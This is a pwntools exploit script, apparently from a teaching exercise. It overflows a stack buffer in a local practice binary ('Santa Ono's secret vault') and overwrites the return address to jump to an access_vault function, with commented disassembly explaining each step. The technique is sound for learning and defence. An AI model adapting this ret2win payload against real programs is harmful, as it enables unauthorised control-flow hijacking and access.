#!/usr/bin/env python3

from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')

    args = parser.parse_args()

    # Tell pwntools our target process to automate future functions
    elf = context.binary = ELF('buffer_overflow')

    access_vault_function_addr = elf.symbols['access_vault']

    if args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()  # Actually start running the process

    # Wait until we are prompted with input
    # Notice how we use the "b" literal to mark it as a bytes object
    # https://docs.python.org/3/library/stdtypes.html#binary-sequence-types-bytes-bytearray-memoryview
    io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")

    # "disassemble main" in GDB launched with "gdb buffer_overflow"
    # Dump of assembler code for function main:
    #    0x00000000004011a3 <+0>:	endbr64
    #    0x00000000004011a7 <+4>:	push   rbp
    #    0x00000000004011a8 <+5>:	mov    rbp,rsp
    #    0x00000000004011ab <+8>:	sub    rsp,0x10
    #    0x00000000004011af <+12>:	lea    rdi,[rip+0xe6a]              # 0x402020
    #    0x00000000004011b6 <+19>:	call   0x401060 <puts@plt>
    #    0x00000000004011bb <+24>:	mov    rdx,QWORD PTR [rip+0x2e7e]   # 0x404040 <stdin@@GLIBC_2.2.5>
    #    0x00000000004011c2 <+31>:	lea    rax,[rbp-0x10]
    #    0x00000000004011c6 <+35>:	mov    esi,0x20
    #    0x00000000004011cb <+40>:	mov    rdi,rax
    #    0x00000000004011ce <+43>:	call   0x401070 <fgets@plt>
    #    0x00000000004011d3 <+48>:	mov    eax,0x0
    #    0x00000000004011d8 <+53>:	leave
    #    0x00000000004011d9 <+54>:	ret    <-- returns to our injected address

    # In assembly you can read "sub rsp,0x10" at the start of "main"
    # We need to write past 0x10 bytes to start modifying maliciously
    dummy_data = b'A' * 0x10
    # The saved ebp doesn't really matter
    # We only execute one other function which doesn't need it
    saved_ebp = b'B' * 0x8
    # We have to pack the address properly (endianess!)
    redirect_addr = p64(access_vault_function_addr)
    # Craft the final bytes payload
    payload = dummy_data + saved_ebp + redirect_addr

    # Overflow stack and get redirection
    # fgets will write past the end of the stack frame
    # It will set the return eip on the stack
    # The "ret" instruction will use this to go to our address
    io.send(payload)

    # Open up stdin to terminal input
    # Required so you can start using the shell interactively
    # Generally speaking you add this after popping a shell
    io.interactive()
